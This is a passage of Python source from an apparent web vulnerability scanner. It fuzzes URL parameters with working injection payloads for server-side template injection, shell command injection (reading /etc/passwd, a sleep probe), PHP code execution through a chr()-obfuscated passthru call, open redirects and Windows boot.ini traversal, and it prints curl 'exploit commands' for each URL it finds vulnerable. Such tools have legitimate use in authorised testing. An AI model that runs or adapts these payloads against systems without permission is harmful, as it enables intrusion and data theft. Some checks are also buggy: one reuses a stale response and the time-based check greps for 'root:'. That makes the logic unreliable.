    #      print(OKGREEN + "[c] Exploit Command: curl -s '" + idor_url + "'")
    #    #else:
    #      #print(COLOR1 + "[F] IDOR Failed." + RESET)
    #  except:
    #    pass

    # Buffer Overflow Check ######################################################################################
    # try:
    #  overflow_exploit = "INJECTX" * 4000
    #  # print COLOR2 + "[i] Trying Payload: " + "INJECTXINJECTXINJECTXINJECTXINJECTXINJECTX..." + RESET
    #  overflow_url = new_url.replace("INJECTX", overflow_exploit)
    #  http_request = urllib.request.urlopen(overflow_url)
    #  http_response = http_request.read()
    #  http_length = len(http_response)
    #  http_status = http_request.getcode()
    #  print COLOR2 + "[i] New URL: " + new_url + "INJECTXINJECTXINJECTXINJECTXINJECTXINJECTX..." + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + RESET
    #
    #  if http_status != 200 or http_status != 414 or http_status != 413:
    #    print OKGREEN + "[+] Possible Buffer Overflow Found! " + RESET
    #  else:
    #    print COLOR1 + "[F] Buffer Overflow Failed." + RESET
    # except:
    #  pass
    #

    # SSTI Check ######################################################################################
    result_string = "benign"
    ssti_exploit = urllib.parse.quote("{{1336%2B1}}")
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)
    ssti_url = new_url.replace("INJECTX", ssti_exploit)

    res_ssti = await session.get(ssti_url)
    try:

        # http_request = urllib.request.urlopen(ssti_url)
        http_response = str(await res_ssti.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_ssti.status
        json_list.append(json.dumps(dict(res_ssti.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + ssti_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "1337" in http_response:
            print(OKRED + "[+] Server Side Template Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + ssti_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + ssti_url
                + "' | egrep 1337 --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = ["SSTI Check", http_status, ssti_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # SSTI Check 2 ######################################################################################
    result_string = "benign"
    ssti_exploit = urllib.parse.quote("1336+1")
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)

    ssti_url = new_url.replace("INJECTX", ssti_exploit)

    res_ssti = await session.get(ssti_url)
    try:

        # http_request = urllib.request.urlopen(ssti_url)
        http_response = str(await res_ssti.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_ssti.status
        json_list.append(json.dumps(dict(res_ssti.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + ssti_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "1337" in http_response:
            print(OKRED + "[+] Server Side Template Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + ssti_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + ssti_url
                + "' | egrep 1337 --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = ["SSTI Check", http_status, ssti_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # RCE Linux Check ######################################################################################
    result_string = "benign"
    rce_exploit = urllib.parse.quote("$(cat+/etc/passwd)")
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(rce_exploit) + RESET)

    rce_url = new_url.replace("INJECTX", rce_exploit)

    res_rce = await session.get(rce_url)
    try:

        # http_request = urllib.request.urlopen(rce_url)
        http_response = str(await res_rce.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rce.status
        json_list.append(json.dumps(dict(res_rce.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + rce_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "root:" in http_response:
            print(OKRED + "[+] Linux Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + rce_url
                + "' | egrep root: --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = ["RCE Linux Check", http_status, rce_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # RCE Linux Check 2 ######################################################################################
    result_string = "benign"
    rce_exploit = urllib.parse.quote("$(sleep+10)")
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(rce_exploit) + RESET)

    rce_url = new_url.replace("INJECTX", rce_exploit)

    res_rce = await session.get(rce_url)
    try:

        # http_request = urllib.request.urlopen(rce_url)
        http_response = str(await res_rce.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rce.status
        json_list.append(json.dumps(dict(res_rce.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + rce_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "root:" in http_response:
            print(OKRED + "[+] Linux Time Based Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + rce_url
                + "' | egrep root: --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = ["RCE Linux Check", http_status, rce_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # RCE PHP Check ######################################################################################
    result_string = "benign"
    rce_exploit = urllib.parse.quote("phpinfo()")
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(rce_exploit) + RESET)

    rce_url = new_url.replace("INJECTX", rce_exploit)

    res_rce = await session.get(rce_url)
    try:

        # http_request = urllib.request.urlopen(rce_url)
        http_response = str(await res_rce.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rce.status
        json_list.append(json.dumps(dict(res_rce.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + rce_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "<title>phpinfo()</title>" in http_response:
            print(OKRED + "[+] Generic PHP Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + rce_url
                + "' | egrep PHP --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = ["RCE PHP Check", http_status, rce_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # RCE PHP Check 2 ######################################################################################
    result_string = "benign"
    rce_exploit = urllib.parse.quote(
        "{${passthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))}}{${exit()}}"
    )
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)

    rce_url = new_url.replace("INJECTX", rce_exploit)

    res_rce = await session.get(rce_url)
    try:

        # http_request = urllib.request.urlopen(rce_url)
        http_response = str(await res_rce.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rce.status
        json_list.append(json.dumps(dict(res_rce.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + rce_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "root:" in http_response:
            print(OKRED + "[+] Linux PHP Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + rce_url
                + "' | egrep root: --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = ["RCE PHP Check", http_status, rce_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    # RCE PHP Check 3 ######################################################################################
    result_string = "benign"
    rce_exploit = urllib.parse.quote(
        "{${passthru(chr(115).chr(108).chr(101).chr(101).chr(112).chr(32).chr(49).chr(48))}}{${exit()}}"
    )
    if verbose == "y":
        print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET)

    rce_url = new_url.replace("INJECTX", rce_exploit)

    try:

        # http_request = urllib.request.urlopen(rce_url)
        http_response = str(await res_rce.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = res_rce.status
        json_list.append(json.dumps(dict(res_rce.headers)))
        if verbose == "y":
            print(
                COLOR2
                + "[i] New URL: "
                + rce_url
                + " ["
                + OKRED
                + str(http_status)
                + COLOR2
                + COLOR2
                + "]"
                + " ["
                + COLOR3
                + str(http_length)
                + COLOR2
                + "]"
                + " ["
                + COLOR1
                + http_length_diff
                + COLOR2
                + "]"
                + RESET
            )

        if "root:" in http_response:
            print(OKRED + "[+] PHP Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(
                OKGREEN
                + "[c] Exploit Command: curl -s '"
                + rce_url
                + "' | egrep root: --color=auto"
                + RESET
            )
            result_string = "vulnerable"

        csvLine = ["RCE PHP Check", http_status, rce_url, result_string]
        csvWriter.writerow(csvLine)
        data = json.dumps(csvLine)
        serializer = ReportsSerializer(data=data)
        serializer.save()

    except:
        pass

    for jsonItem in json_list:
        jsonFile.write(jsonItem)
        jsonFile.write("\n")


async def main(
    url, cookies="", verbose="y", csvWriter=None, session=None, jsonFile=None
):
    logo()
    json_list = []
    full_url = str(url)
    payload = "INJECTX"
    http_status_base = "404"
    http_length_base = "0"

    async with session.get(full_url) as res:
        http_response_base = str(await res.read())
        http_length_base = len(http_response_base)
        http_status_base = res.status

        if str(http_status_base) == "404":
            print(
                COLOR1
                + "[F] Received HTTP Status 404 - Page Not Found. Skipping..."
                + RESET
            )

        elif str(http_status_base) == "403":
            print(
                COLOR1
                + "[F] Received HTTP Status 403 - Page Not Found. Skipping..."
                + RESET
            )

        else:
            if "=" in full_url:

                parsed = urllib.request.urlparse(full_url)
                params = urllib.parse.parse_qsl(parsed.query)
                param_list = []
                param_vals = []
                param_length = 0

                for x, y in params:
                    param_list.extend([str(x + "=")])
                    param_vals.extend([str(urllib.parse.quote_plus(y))])
                    param_length = param_length + 1

                # FIND BASE URL
                dynamic_url = full_url.find("?")
                base_url = str(full_url[: dynamic_url + 1])

                # LIST EACH PARAMETER
                active_fuzz = 1
                i = 1

                #   http_request_base = urllib.request.urlopen(full_url)
                #   http_response_base = http_request_base.read()
                #   http_length_base = len(http_response_base)
                #   http_status_base = http_request_base.getcode()

                #   http_request_base = await session.get(full_url)
                #   http_response_base = await http_request_base.read()
                #   http_length_base = len(http_response_base)
                #   http_status_base = http_request_base.status

                #   async with session.get(full_url) as resHttp:

                print(RESET)
                print(
                    COLOR3
                    + ">>> "
                    + OKORANGE
                    + full_url
                    + COLOR2
                    + " ["
                    + OKRED
                    + str(http_status_base)
                    + COLOR2
                    + "]"
                    + " ["
                    + COLOR3
                    + str(http_length_base)
                    + COLOR2
                    + "]"
                    + RESET
                )
                print(
                    COLOR3
                    + "======================================================================================================"
                    + RESET
                )

                while i <= param_length and active_fuzz <= param_length:
                    if i < param_length and i == active_fuzz:
                        print(
                            OKORANGE
                            + "[D] Fuzzing Parameter: "
                            + param_list[i - 1]
                            + RESET
                        )
                        print(
                            OKORANGE
                            + "----------------------------------------------------"
                            + RESET
                        )
                        base_url += param_list[i - 1] + payload + "&"
                        i = i + 1

                    elif i == param_length and i == active_fuzz:
                        print(
                            OKORANGE
                            + "[D] Fuzzing Parameter: "
                            + param_list[i - 1]
                            + RESET
                        )
                        print(
                            OKORANGE
                            + "----------------------------------------------------"
                            + RESET
                        )
                        base_url += param_list[i - 1] + payload
                        active_fuzz = active_fuzz + 1
                        i = i + 1
                        await active_scan(
                            session,
                            full_url,
                            base_url,
                            http_length_base,
                            payload,
                            verbose,
                            csvWriter,
                            jsonFile,
                        )
                        base_url = str(full_url[: dynamic_url + 1])

                    elif i == param_length and i != active_fuzz:
                        base_url += param_list[i - 1] + param_vals[i - 1]
                        active_fuzz = active_fuzz + 1
                        i = 1
                        await active_scan(
                            session,
                            full_url,
                            base_url,
                            http_length_base,
                            payload,
                            verbose,
                            csvWriter,
                            jsonFile,
                        )
                        base_url = str(full_url[: dynamic_url + 1])

                    elif i == param_length:
                        base_url += param_list[i - 1] + param_vals[i - 1]
                        active_fuzz = active_fuzz + 1
                        i = 1
                        await active_scan(
                            session,
                            full_url,
                            base_url,
                            http_length_base,
                            payload,
                            verbose,
                            csvWriter,
                            jsonFile,
                        )
                        base_url = str(full_url[: dynamic_url + 1])

                    else:
                        base_url += param_list[i - 1] + param_vals[i - 1] + "&"
                        i = i + 1

            else:
                result_string = "benign"
                new_url = full_url + "INJECTX"
                redirect_exploit = urllib.parse.quote("//google.com")

                if verbose == "y":
                    print(
                        COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET
                    )

                redirect_url = new_url.replace("INJECTX", redirect_exploit)

                red_res = await session.get(redirect_url)
                try:
                    http_response = str(await red_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)
                    json_list.append(json.dumps(dict(red_res.headers)))

                    if verbose == "y":
                        print(
                            COLOR2
                            + "[i] New URL: "
                            + redirect_url
                            + " ["
                            + OKRED
                            + str(http_status)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR3
                            + str(http_length)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR1
                            + http_length_diff
                            + COLOR2
                            + "]"
                            + RESET
                        )

                    if "<title>Google</title>" in http_response:
                        print(OKRED + "[+] Open Redirect Found! " + RESET)
                        print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                        print(
                            OKGREEN
                            + "[c] Exploit Command: curl -s -I '"
                            + redirect_url
                            + "' | egrep location --color=auto"
                            + RESET
                        )
                        result_string = "vulnerable"

                    csvLine = [
                        "Open Redirect",
                        red_res.status,
                        redirect_url,
                        result_string,
                    ]
                    csvWriter.writerow(csvLine)
                    data = json.dumps(csvLine)
                    serializer = ReportsSerializer(data=data)
                    serializer.save()

                except:
                    pass

                # async with session.get(redirect_url) as red_res:
                #   http_response = str(await red_res.read())
                #   http_length = len(http_response)
                #   http_status = red_res.status
                #   http_length_diff = str(http_length_base - http_length)

                #   if (verbose == "y"):
                #     print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

                #   if "<title>Google</title>" in http_response:
                #     print(OKRED + "[+] Open Redirect Found! " + RESET)
                #     print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                #     print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto" + RESET)

                # Open Redirect ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                redirect_exploit = urllib.parse.quote("/<>//google.com")

                if verbose == "y":
                    print(
                        COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET
                    )

                redirect_url = new_url.replace("INJECTX", redirect_exploit)

                red_res = await session.get(redirect_url)
                try:
                    http_response = str(await red_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)
                    json_list.append(json.dumps(dict(red_res.headers)))

                    if verbose == "y":
                        print(
                            COLOR2
                            + "[i] New URL: "
                            + redirect_url
                            + " ["
                            + OKRED
                            + str(http_status)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR3
                            + str(http_length)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR1
                            + http_length_diff
                            + COLOR2
                            + "]"
                            + RESET
                        )

                    if "<title>Google</title>" in http_response:
                        print(OKRED + "[+] Open Redirect Found! " + RESET)
                        print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                        print(
                            OKGREEN
                            + "[c] Exploit Command: curl -s -I '"
                            + redirect_url
                            + "' | egrep location --color=auto"
                            + RESET
                        )
                        result_string = "vulnerable"

                    csvLine = [
                        "Open Redirect",
                        red_res.status,
                        redirect_url,
                        result_string,
                    ]
                    csvWriter.writerow(csvLine)
                    data = json.dumps(csvLine)
                    serializer = ReportsSerializer(data=data)
                    serializer.save()

                except:
                    pass

                # async with session.get(redirect_url) as red_res:
                #   http_response = str(await red_res.read())
                #   http_length = len(http_response)
                #   http_status = red_res.status
                #   http_length_diff = str(http_length_base - http_length)

                #   if (verbose == "y"):
                #     print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

                #   if "<title>Google</title>" in http_response:
                #     print(OKRED + "[+] Open Redirect Found! " + RESET)
                #     print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                #     print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto" + RESET)

                # Open Redirect ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                redirect_exploit = urllib.parse.quote("/%252F%252Fgoogle.com")
                if verbose == "y":
                    print(
                        COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET
                    )

                redirect_url = new_url.replace("INJECTX", redirect_exploit)

                red_res = await session.get(redirect_url)
                try:
                    http_response = str(await red_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)
                    json_list.append(json.dumps(dict(red_res.headers)))

                    if verbose == "y":
                        print(
                            COLOR2
                            + "[i] New URL: "
                            + redirect_url
                            + " ["
                            + OKRED
                            + str(http_status)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR3
                            + str(http_length)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR1
                            + http_length_diff
                            + COLOR2
                            + "]"
                            + RESET
                        )

                    if "<title>Google</title>" in http_response:
                        print(OKRED + "[+] Open Redirect Found! " + RESET)
                        print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                        print(
                            OKGREEN
                            + "[c] Exploit Command: curl -s -I '"
                            + redirect_url
                            + "' | egrep location --color=auto"
                            + RESET
                        )
                        result_string = "vulnerable"

                    csvLine = [
                        "Open Redirect",
                        red_res.status,
                        redirect_url,
                        result_string,
                    ]
                    csvWriter.writerow(csvLine)
                    data = json.dumps(csvLine)
                    serializer = ReportsSerializer(data=data)
                    serializer.save()

                except:
                    pass

                # async with session.get(redirect_url) as red_res:
                #   http_response = str(await red_res.read())
                #   http_length = len(http_response)
                #   http_status = red_res.status
                #   http_length_diff = str(http_length_base - http_length)

                #   if (verbose == "y"):
                #     print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

                #   if "<title>Google</title>" in http_response:
                #     print(OKRED + "[+] Open Redirect Found! " + RESET)
                #     print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                #     print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto" + RESET)

                # Open Redirect ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                redirect_exploit = urllib.parse.quote("////google.com/%2e%2e")
                if verbose == "y":
                    print(
                        COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET
                    )

                redirect_url = new_url.replace("INJECTX", redirect_exploit)

                red_res = await session.get(redirect_url)
                try:
                    http_response = str(await red_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)
                    json_list.append(json.dumps(dict(red_res.headers)))

                    if verbose == "y":
                        print(
                            COLOR2
                            + "[i] New URL: "
                            + redirect_url
                            + " ["
                            + OKRED
                            + str(http_status)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR3
                            + str(http_length)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR1
                            + http_length_diff
                            + COLOR2
                            + "]"
                            + RESET
                        )

                    if "<title>Google</title>" in http_response:
                        print(OKRED + "[+] Open Redirect Found! " + RESET)
                        print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                        print(
                            OKGREEN
                            + "[c] Exploit Command: curl -s -I '"
                            + redirect_url
                            + "' | egrep location --color=auto"
                            + RESET
                        )
                        result_string = "vulnerable"

                    csvLine = [
                        "Open Redirect",
                        red_res.status,
                        redirect_url,
                        result_string,
                    ]
                    csvWriter.writerow(csvLine)
                    data = json.dumps(csvLine)
                    serializer = ReportsSerializer(data=data)
                    serializer.save()

                except:
                    pass

                # async with session.get(redirect_url) as red_res:
                #   http_response = str(await red_res.read())
                #   http_length = len(http_response)
                #   http_status = red_res.status
                #   http_length_diff = str(http_length_base - http_length)

                #   if (verbose == "y"):
                #     print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

                #   if "<title>Google</title>" in http_response:
                #     print(OKRED + "[+] Open Redirect Found! " + RESET)
                #     print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                #     print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto" + RESET)

                # Open Redirect ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                redirect_exploit = urllib.parse.quote("/https:/%5cgoogle.com/")
                if verbose == "y":
                    print(
                        COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET
                    )

                redirect_url = new_url.replace("INJECTX", redirect_exploit)

                red_res = await session.get(redirect_url)
                try:
                    http_response = str(await red_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)
                    json_list.append(json.dumps(dict(red_res.headers)))

                    if verbose == "y":
                        print(
                            COLOR2
                            + "[i] New URL: "
                            + str(redirect_url)
                            + " ["
                            + OKRED
                            + str(http_status)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR3
                            + str(http_length)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR1
                            + str(http_length_diff)
                            + COLOR2
                            + "]"
                            + RESET
                        )

                    if "<title>Google</title>" in http_response:
                        print(OKRED + "[+] Open Redirect Found! " + RESET)
                        print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                        print(
                            OKGREEN
                            + "[c] Exploit Command: curl -s -I '"
                            + redirect_url
                            + "' | egrep location --color=auto"
                            + RESET
                        )
                        result_string = "vulnerable"

                    csvLine = [
                        "Open Redirect",
                        red_res.status,
                        redirect_url,
                        result_string,
                    ]
                    csvWriter.writerow(csvLine)
                    data = json.dumps(csvLine)
                    serializer = ReportsSerializer(data=data)
                    serializer.save()

                except:
                    pass

                # async with session.get(redirect_url) as red_res:
                #   http_response = str(await red_res.read())
                #   http_length = len(http_response)
                #   http_status = red_res.status
                #   http_length_diff = str(http_length_base - http_length)

                #   if (verbose == "y"):
                #     print(COLOR2 + "[i] New URL: " + str(redirect_url) + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + str(http_length_diff) + COLOR2 + "]" + RESET)

                #   if "<title>Google</title>" in http_response:
                #     print(OKRED + "[+] Open Redirect Found! " + RESET)
                #     print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
                #     print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto" + RESET)

                # Windows Directory Traversal ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                traversal_exploit = urllib.parse.quote(
                    "..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini"
                )
                if verbose == "y":
                    print(
                        COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET
                    )

                traversal_url = new_url.replace("INJECTX", traversal_exploit)

                trav_res = await session.get(traversal_url)
                try:
                    http_response = str(await trav_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)
                    json_list.append(json.dumps(dict(trav_res.headers)))

                    if verbose == "y":
                        print(
                            COLOR2
                            + "[i] New URL: "
                            + traversal_url
                            + " ["
                            + OKRED
                            + str(http_status)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR3
                            + str(http_length)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR1
                            + http_length_diff
                            + COLOR2
                            + "]"
                            + RESET
                        )

                    if "boot loader" in http_response or "16-bit" in http_response:
                        print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
                        print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
                        print(
                            OKGREEN
                            + "[c] Exploit Command: curl -s '"
                            + traversal_url
                            + "' | egrep Windows --color=auto"
                            + RESET
                        )
                        result_string = "vulnerable"

                    csvLine = [
                        "Windows Directory Traversal",
                        trav_res.status,
                        traversal_url,
                        result_string,
                    ]
                    csvWriter.writerow(csvLine)
                    data = json.dumps(csvLine)
                    serializer = ReportsSerializer(data=data)
                    serializer.save()

                except:
                    pass

                # async with session.get(traversal_url) as trav_res:
                #   http_response = str(await trav_res.read())
                #   http_length = len(http_response)
                #   http_status = red_res.status
                #   http_length_diff = str(http_length_base - http_length)

                #   if (verbose == "y"):
                #     print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

                #   if "boot loader" in http_response or "16-bit" in http_response:
                #     print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
                #     print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
                #     print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto" + RESET)

                # Windows Directory Traversal 2 ######################################################################################
                result_string = "benign"
                new_url = full_url + "INJECTX"
                traversal_exploit = urllib.parse.quote(
                    "..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00"
                )
                if verbose == "y":
                    print(
                        COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET
                    )

                traversal_url = new_url.replace("INJECTX", traversal_exploit)

                trav_res = await session.get(traversal_url)
                try:
                    http_response = str(await trav_res.read())
                    http_length = len(http_response)
                    http_status = red_res.status
                    http_length_diff = str(http_length_base - http_length)
                    json_list.append(json.dumps(dict(trav_res.headers)))

                    if verbose == "y":
                        print(
                            COLOR2
                            + "[i] New URL: "
                            + traversal_url
                            + " ["
                            + OKRED
                            + str(http_status)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR3
                            + str(http_length)
                            + COLOR2
                            + "]"
                            + " ["
                            + COLOR1
                            + http_length_diff
                            + COLOR2
                            + "]"
                            + RESET
                        )

                    if "boot loader" in http_response or "16-bit" in http_response:
                        print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
                        print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
                        print(
                            OKGREEN
                            + "[c] Exploit Command: curl -s '"
                            + traversal_url
                            + "' | egrep Windows --color=auto"
                            + RESET
                        )
                        result_string = "vulnerable"

                    csvLine = [
                        "Windows Directory Traversal",
                        trav_res.status,
                        traversal_url,
                        result_string,
                    ]
                    csvWriter.writerow(csvLine)
                    data = json.dumps(csvLine)
                    serializer = ReportsSerializer(data=data)
                    serializer.save()

                except:
                    pass

                # async with session.get(traversal_url) as trav_res:
                #   http_response = str(await trav_res.read())
                #   http_length = len(http_response)
                #   http_status = red_res.status
                #   http_length_diff = str(http_length_base - http_length)

                #   if (verbose == "y"):
                #     print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

                #   if "boot loader" in http_response or "16-bit" in http_response:
